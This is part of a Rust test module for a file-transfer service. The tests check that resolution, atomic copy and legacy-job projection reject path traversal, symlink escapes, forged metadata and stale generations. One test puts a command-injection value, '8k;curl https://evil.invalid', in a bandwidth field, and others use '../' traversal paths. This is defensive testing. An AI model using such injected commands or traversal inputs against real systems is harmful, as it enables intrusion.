        destination: Mutex<VecDeque<Result<ResolvedFilesEndpoint, FilesResolveFailure>>>,
        calls: Mutex<Vec<(TransferLocation, FilesEndpointRole)>>,
    }

    impl ResolverFixture {
        fn stable(source: ResolvedFilesEndpoint, destination: ResolvedFilesEndpoint) -> Self {
            Self::sequence(
                vec![Ok(source.clone()); 6],
                vec![Ok(destination.clone()); 6],
            )
        }

        fn sequence(
            source: Vec<Result<ResolvedFilesEndpoint, FilesResolveFailure>>,
            destination: Vec<Result<ResolvedFilesEndpoint, FilesResolveFailure>>,
        ) -> Self {
            Self {
                source: Mutex::new(source.into()),
                destination: Mutex::new(destination.into()),
                calls: Mutex::new(Vec::new()),
            }
        }
    }

    impl FilesEndpointResolver for ResolverFixture {
        fn resolve(
            &self,
            identity: &TransferLocation,
            role: FilesEndpointRole,
        ) -> Result<ResolvedFilesEndpoint, FilesResolveFailure> {
            self.calls
                .lock()
                .expect("fixture calls lock")
                .push((identity.clone(), role));
            match role {
                FilesEndpointRole::Source => {
                    self.source.lock().expect("fixture source lock").pop_front()
                }
                FilesEndpointRole::Destination => self
                    .destination
                    .lock()
                    .expect("fixture destination lock")
                    .pop_front(),
            }
            .expect("fixture has one answer per resolver call")
        }
    }

    struct ExecutionFixture {
        _temp: TempDir,
        root: PathBuf,
        job: TransferJobV2,
        source: ResolvedFilesEndpoint,
        destination: ResolvedFilesEndpoint,
    }

    fn digest(bytes: &[u8]) -> String {
        format!("{:x}", Sha256::digest(bytes))
    }

    fn record(
        identity: TransferLocation,
        root: &Path,
        relative_path: impl Into<PathBuf>,
        generation: u64,
        bytes: &[u8],
    ) -> ResolvedFilesEndpoint {
        ResolvedFilesEndpoint {
            identity,
            canonical_root: root.to_path_buf(),
            relative_path: relative_path.into(),
            generation,
            sha256_hex: digest(bytes),
            size_bytes: bytes.len() as u64,
            object_type: FilesObjectType::RegularFile,
            available: true,
            readable: true,
            writable: true,
        }
    }

    fn execution_fixture() -> ExecutionFixture {
        let temp = tempfile::tempdir().expect("temporary Files registry");
        let root = temp
            .path()
            .canonicalize()
            .expect("canonical temporary root");
        let source_bytes = b"source-generation-seven";
        let destination_bytes = b"destination-generation-three";
        fs::write(root.join("source.bin"), source_bytes).expect("source payload");
        fs::write(root.join("destination.bin"), destination_bytes).expect("destination payload");

        let endpoint = identity().endpoint;
        let job = TransferJobV2::new(
            TransferId::from_uuid(Uuid::from_u128(0x301)),
            TransferKind::Mesh,
            endpoint.clone(),
            TransferOperation::Copy {
                direction: TransferDirection::Inbound,
            },
            ChecksumPolicy::verify(),
            None,
            100,
        )
        .expect("valid queued V2 job");
        let source = record(endpoint.source, &root, "source.bin", 7, source_bytes);
        let destination = record(
            endpoint.destination,
            &root,
            "destination.bin",
            3,
            destination_bytes,
        );
        ExecutionFixture {
            _temp: temp,
            root,
            job,
            source,
            destination,
        }
    }

    fn file(seed: u128) -> FileRefId {
        FileRefId::from_uuid(Uuid::from_u128(seed))
    }

    fn identity() -> TransferV2Identity {
        TransferV2Identity::new(
            TransferId::from_uuid(Uuid::from_u128(0x101)),
            TransferKind::Mesh,
            TransferEndpoint::new(
                TransferLocation::Mesh {
                    node: OpaqueNodeRef::new("peer-oak").expect("safe node ref"),
                    object: file(0x201),
                },
                TransferLocation::Local {
                    object: file(0x202),
                },
            ),
            TransferOperation::Copy {
                direction: TransferDirection::Inbound,
            },
        )
    }

    fn queued_job() -> TransferJob {
        let mut job = TransferJob::new(
            "https://user:password@example.invalid/private.tar",
            "/srv/secret/private.tar",
            Method::Node,
            TransferPolicy {
                bwlimit: None,
                verify: true,
            },
        );
        job.created_ms = 10;
        job.updated_ms = 20;
        job
    }

    #[test]
    fn resolution_binds_exact_files_generation_hash_size_and_type() {
        let fixture = execution_fixture();
        let resolver = ResolverFixture::stable(fixture.source.clone(), fixture.destination.clone());
        let expected_job = fixture.job.clone();

        let admitted = resolve_for_execution(fixture.job, &resolver).expect("resolved admission");
        assert_eq!(admitted.job(), &expected_job);
        assert_eq!(admitted.source().identity(), &fixture.source.identity);
        assert_eq!(admitted.source().generation(), 7);
        assert_eq!(admitted.source().sha256_hex(), fixture.source.sha256_hex);
        assert_eq!(admitted.source().size_bytes(), fixture.source.size_bytes);
        assert_eq!(
            admitted.source().object_type(),
            FilesObjectType::RegularFile
        );
        assert_eq!(
            admitted.source().canonical_path(),
            fixture.root.join("source.bin")
        );
        assert_eq!(admitted.destination().generation(), 3);

        let calls = resolver.calls.lock().expect("fixture calls lock");
        assert_eq!(calls.len(), 4, "both typed identities are read twice");
        assert_eq!(
            calls[0],
            (fixture.source.identity, FilesEndpointRole::Source)
        );
        assert_eq!(
            calls[1],
            (fixture.destination.identity, FilesEndpointRole::Destination)
        );
    }

    #[test]
    fn local_mesh_copy_revalidates_and_atomically_replaces_destination() {
        let fixture = execution_fixture();
        let resolver = ResolverFixture::stable(fixture.source.clone(), fixture.destination.clone());
        let admitted = resolve_for_execution(fixture.job, &resolver).expect("resolved admission");
        let outcome = execute_local_mesh_copy(&admitted, &resolver, &AtomicBool::new(false))
            .expect("atomic copy");
        assert_eq!(outcome.bytes_copied, fixture.source.size_bytes);
        assert_eq!(outcome.sha256_hex, fixture.source.sha256_hex);
        assert_eq!(
            fs::read(fixture.root.join("destination.bin")).expect("committed destination"),
            fs::read(fixture.root.join("source.bin")).expect("source remains")
        );
        assert!(fs::read_dir(&fixture.root)
            .expect("registry root")
            .flatten()
            .all(|entry| !entry.file_name().to_string_lossy().ends_with(".part")));
    }

    #[test]
    fn changed_generation_immediately_before_open_aborts_without_commit() {
        let fixture = execution_fixture();
        let original_destination = fs::read(fixture.root.join("destination.bin")).unwrap();
        let mut stale_source = fixture.source.clone();
        stale_source.generation += 1;
        let resolver = ResolverFixture::sequence(
            vec![
                Ok(fixture.source.clone()),
                Ok(fixture.source.clone()),
                Ok(stale_source),
            ],
            vec![
                Ok(fixture.destination.clone()),
                Ok(fixture.destination.clone()),
                Ok(fixture.destination.clone()),
            ],
        );
        let admitted = resolve_for_execution(fixture.job, &resolver).expect("initial admission");
        assert_eq!(
            execute_local_mesh_copy(&admitted, &resolver, &AtomicBool::new(false)),
            Err(FilesCopyError::Revalidation(
                TransferV2ResolutionError::StaleResolution(FilesEndpointRole::Source)
            ))
        );
        assert_eq!(
            fs::read(fixture.root.join("destination.bin")).unwrap(),
            original_destination
        );
    }

    #[cfg(unix)]
    #[test]
    fn unwritable_staging_directory_fails_without_destination_or_metadata_commit() {
        use std::os::unix::fs::PermissionsExt as _;

        let fixture = execution_fixture();
        let original_destination = fs::read(fixture.root.join("destination.bin")).unwrap();
        let resolver = ResolverFixture::stable(fixture.source.clone(), fixture.destination.clone());
        let admitted = resolve_for_execution(fixture.job, &resolver).expect("resolved admission");
        let original_mode = fs::metadata(&fixture.root).unwrap().permissions().mode();
        fs::set_permissions(&fixture.root, fs::Permissions::from_mode(0o500)).unwrap();
        let result = execute_local_mesh_copy(&admitted, &resolver, &AtomicBool::new(false));
        fs::set_permissions(&fixture.root, fs::Permissions::from_mode(original_mode)).unwrap();
        assert_eq!(
            result,
            Err(FilesCopyError::Commit(FilesCommitFailure::Filesystem))
        );
        assert_eq!(
            fs::read(fixture.root.join("destination.bin")).unwrap(),
            original_destination
        );
    }

    #[test]
    fn canceled_attempt_never_opens_or_commits_destination() {
        let fixture = execution_fixture();
        let original_destination = fs::read(fixture.root.join("destination.bin")).unwrap();
        let resolver = ResolverFixture::stable(fixture.source.clone(), fixture.destination.clone());
        let admitted = resolve_for_execution(fixture.job, &resolver).expect("resolved admission");
        let canceled = AtomicBool::new(true);
        assert_eq!(
            execute_local_mesh_copy(&admitted, &resolver, &canceled),
            Err(FilesCopyError::Canceled)
        );
        assert_eq!(
            fs::read(fixture.root.join("destination.bin")).unwrap(),
            original_destination
        );
    }

    #[test]
    fn resolver_identity_mismatch_is_rejected() {
        let fixture = execution_fixture();
        let mut hostile_source = fixture.source.clone();
        hostile_source.identity = fixture.destination.identity.clone();
        let resolver = ResolverFixture::stable(hostile_source, fixture.destination);
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::IdentityMismatch(
                FilesEndpointRole::Source
            ))
        );
    }

    #[test]
    fn unavailable_zero_generation_and_denied_access_fail_closed() {
        let fixture = execution_fixture();
        let mut unavailable = fixture.source.clone();
        unavailable.available = false;
        let resolver = ResolverFixture::stable(unavailable, fixture.destination.clone());
        assert_eq!(
            resolve_for_execution(fixture.job.clone(), &resolver),
            Err(TransferV2ResolutionError::Unavailable(
                FilesEndpointRole::Source
            ))
        );

        let mut zero_generation = fixture.source.clone();
        zero_generation.generation = 0;
        let resolver = ResolverFixture::stable(zero_generation, fixture.destination.clone());
        assert_eq!(
            resolve_for_execution(fixture.job.clone(), &resolver),
            Err(TransferV2ResolutionError::Unavailable(
                FilesEndpointRole::Source
            ))
        );

        let mut denied = fixture.destination.clone();
        denied.writable = false;
        let resolver = ResolverFixture::stable(fixture.source, denied);
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::AccessDenied(
                FilesEndpointRole::Destination
            ))
        );
    }

    #[test]
    fn stale_generation_or_metadata_change_is_rejected() {
        let fixture = execution_fixture();
        let first_source = fixture.source.clone();
        let mut changed_source = first_source.clone();
        changed_source.generation += 1;
        let resolver = ResolverFixture::sequence(
            vec![Ok(first_source), Ok(changed_source)],
            vec![
                Ok(fixture.destination.clone()),
                Ok(fixture.destination.clone()),
            ],
        );
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::StaleResolution(
                FilesEndpointRole::Source
            ))
        );
    }

    #[test]
    fn hostile_escape_and_noncanonical_root_are_rejected() {
        let fixture = execution_fixture();
        let mut escaping = fixture.source.clone();
        escaping.relative_path = PathBuf::from("../source.bin");
        let resolver = ResolverFixture::stable(escaping, fixture.destination.clone());
        assert_eq!(
            resolve_for_execution(fixture.job.clone(), &resolver),
            Err(TransferV2ResolutionError::UnsafePath(
                FilesEndpointRole::Source
            ))
        );

        let mut noncanonical = fixture.source.clone();
        noncanonical.canonical_root = fixture.root.join("subdir/..");
        let resolver = ResolverFixture::stable(noncanonical, fixture.destination);
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::MetadataUnavailable(
                FilesEndpointRole::Source
            ))
        );
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_files_and_intermediate_directories_are_rejected() {
        use std::os::unix::fs::symlink;

        let fixture = execution_fixture();
        let outside = fixture.root.join("outside.bin");
        fs::write(&outside, b"outside").expect("outside payload");
        symlink(&outside, fixture.root.join("link.bin")).expect("file symlink");
        let mut file_link = fixture.source.clone();
        file_link.relative_path = PathBuf::from("link.bin");
        file_link.sha256_hex = digest(b"outside");
        file_link.size_bytes = 7;
        let resolver = ResolverFixture::stable(file_link, fixture.destination.clone());
        assert_eq!(
            resolve_for_execution(fixture.job.clone(), &resolver),
            Err(TransferV2ResolutionError::UnsafePath(
                FilesEndpointRole::Source
            ))
        );

        fs::create_dir(fixture.root.join("actual")).expect("actual directory");
        fs::write(fixture.root.join("actual/nested.bin"), b"nested").expect("nested payload");
        symlink(
            fixture.root.join("actual"),
            fixture.root.join("linked-directory"),
        )
        .expect("directory symlink");
        let mut intermediate_link = fixture.source;
        intermediate_link.relative_path = PathBuf::from("linked-directory/nested.bin");
        intermediate_link.sha256_hex = digest(b"nested");
        intermediate_link.size_bytes = 6;
        let resolver = ResolverFixture::stable(intermediate_link, fixture.destination);
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::UnsafePath(
                FilesEndpointRole::Source
            ))
        );
    }

    #[test]
    fn forged_hash_size_and_type_are_rejected() {
        let fixture = execution_fixture();
        let mut forged_hash = fixture.source.clone();
        forged_hash.sha256_hex = "f".repeat(64);
        let resolver = ResolverFixture::stable(forged_hash, fixture.destination.clone());
        assert_eq!(
            resolve_for_execution(fixture.job.clone(), &resolver),
            Err(TransferV2ResolutionError::MetadataMismatch {
                role: FilesEndpointRole::Source,
                field: "sha256"
            })
        );

        let mut forged_size = fixture.source.clone();
        forged_size.size_bytes += 1;
        let resolver = ResolverFixture::stable(forged_size, fixture.destination.clone());
        assert_eq!(
            resolve_for_execution(fixture.job.clone(), &resolver),
            Err(TransferV2ResolutionError::MetadataMismatch {
                role: FilesEndpointRole::Source,
                field: "size"
            })
        );

        let mut wrong_type = fixture.destination;
        wrong_type.object_type = FilesObjectType::Directory;
        let resolver = ResolverFixture::stable(fixture.source, wrong_type);
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::IncompatibleObjectType(
                FilesEndpointRole::Destination
            ))
        );
    }

    #[test]
    fn required_checksum_is_bound_to_the_resolved_source() {
        let mut fixture = execution_fixture();
        fixture.job.checksum = ChecksumPolicy::require("0".repeat(64)).expect("valid checksum");
        let resolver = ResolverFixture::stable(fixture.source, fixture.destination);
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::ChecksumMismatch)
        );
    }

    #[test]
    fn same_materialized_object_is_not_admitted_as_copy() {
        let fixture = execution_fixture();
        let mut destination = fixture.destination;
        destination.relative_path = fixture.source.relative_path.clone();
        destination.sha256_hex = fixture.source.sha256_hex.clone();
        destination.size_bytes = fixture.source.size_bytes;
        let resolver = ResolverFixture::stable(fixture.source, destination);
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::SameCanonicalObject)
        );
    }

    #[test]
    fn unsupported_protocol_is_typed_before_resolver_access() {
        let fixture = execution_fixture();
        let source = TransferLocation::Http {
            profile: OpaqueProfileRef::new("public-downloads").expect("profile"),
            resource: OpaqueResourceRef::new("release-object").expect("resource"),
        };
        let endpoint = TransferEndpoint::new(source, fixture.destination.identity.clone());
        let job = TransferJobV2::new(
            TransferId::from_uuid(Uuid::from_u128(0x401)),
            TransferKind::Http,
            endpoint,
            TransferOperation::Download,
            ChecksumPolicy::verify(),
            None,
            1,
        )
        .expect("valid opaque HTTP job");
        let resolver = ResolverFixture::stable(fixture.source, fixture.destination);
        assert_eq!(
            resolve_for_execution(job, &resolver),
            Err(TransferV2ResolutionError::UnsupportedKind(
                TransferKind::Http
            ))
        );
        assert!(resolver
            .calls
            .lock()
            .expect("fixture calls lock")
            .is_empty());
    }

    #[test]
    fn resolver_failure_is_bounded_and_does_not_fall_back() {
        let fixture = execution_fixture();
        let resolver = ResolverFixture::sequence(
            vec![Err(FilesResolveFailure::Unavailable)],
            vec![Ok(fixture.destination)],
        );
        assert_eq!(
            resolve_for_execution(fixture.job, &resolver),
            Err(TransferV2ResolutionError::Resolver {
                role: FilesEndpointRole::Source,
                failure: FilesResolveFailure::Unavailable
            })
        );
        assert_eq!(resolver.calls.lock().expect("fixture calls lock").len(), 1);
    }

    #[test]
    fn ledger_projection_round_trips_without_copying_legacy_endpoints() {
        let tmp = tempfile::tempdir().expect("temporary ledger");
        let ledger = super::super::Ledger::open(tmp.path()).expect("open ledger");
        let legacy = queued_job();
        let legacy_id = legacy.id.clone();
        ledger.upsert(&legacy).expect("write legacy row");

        let projected = ledger
            .project_v2(&legacy_id, &identity())
            .expect("typed queued projection");
        assert_eq!(
            projected.transfer,
            TransferId::from_uuid(Uuid::from_u128(0x101))
        );
        assert_eq!(projected.state, SharedTransferState::Queued);
        assert_eq!(projected.progress, TransferProgress::queued());
        assert_eq!(projected.checksum, ChecksumPolicy::verify());
        assert_eq!(projected.created_unix_ms, 10);
        assert_eq!(projected.updated_unix_ms, 20);

        let encoded = serde_json::to_string(&projected).expect("encode V2 job");
        assert!(!encoded.contains("password"));
        assert!(!encoded.contains("/srv/secret"));
        assert!(!encoded.contains("https://"));
        let decoded = TransferJobV2::from_json(&encoded).expect("strict V2 round trip");
        assert_eq!(decoded, projected);
    }

    #[test]
    fn projection_preserves_supplied_file_refs_and_never_mints_them() {
        let legacy = queued_job();
        let typed = identity();
        let expected_source = match &typed.endpoint.source {
            TransferLocation::Mesh { object, .. } => *object,
            _ => panic!("fixture source is mesh"),
        };
        let expected_destination = match &typed.endpoint.destination {
            TransferLocation::Local { object } => *object,
            _ => panic!("fixture destination is local"),
        };

        let projected = project_queued_job(&legacy, &typed).expect("projection");
        assert_eq!(projected.endpoint, typed.endpoint);
        assert_eq!(
            match projected.endpoint.source {
                TransferLocation::Mesh { object, .. } => object,
                _ => panic!("projected source is mesh"),
            },
            expected_source
        );
        assert_eq!(
            match projected.endpoint.destination {
                TransferLocation::Local { object } => object,
                _ => panic!("projected destination is local"),
            },
            expected_destination
        );
    }

    #[test]
    fn hostile_legacy_bandwidth_is_rejected_without_crossing_the_v2_boundary() {
        let mut legacy = queued_job();
        legacy.policy.bwlimit = Some("8k;curl https://evil.invalid".into());
        assert_eq!(
            project_queued_job(&legacy, &identity()),
            Err(TransferV2ProjectionError::LegacyBandwidthLimitNotRepresentable)
        );
    }

    #[test]
    fn non_queued_progress_is_not_synthesized_as_bytes_or_attempts() {
        let mut legacy = queued_job();
        legacy.state = TransferState::Running;
        legacy.progress = Some(42);
        assert_eq!(
            project_queued_job(&legacy, &identity()),
            Err(TransferV2ProjectionError::UnsupportedLegacyState(
                TransferState::Running
            ))
        );
    }

    #[test]
    fn unsupported_legacy_method_is_rejected() {
        let mut legacy = queued_job();
        legacy.method = Method::Music;
        assert_eq!(
            project_queued_job(&legacy, &identity()),
            Err(TransferV2ProjectionError::MethodKindMismatch {
                method: Method::Music,
                kind: TransferKind::Mesh,
            })
        );
    }
}
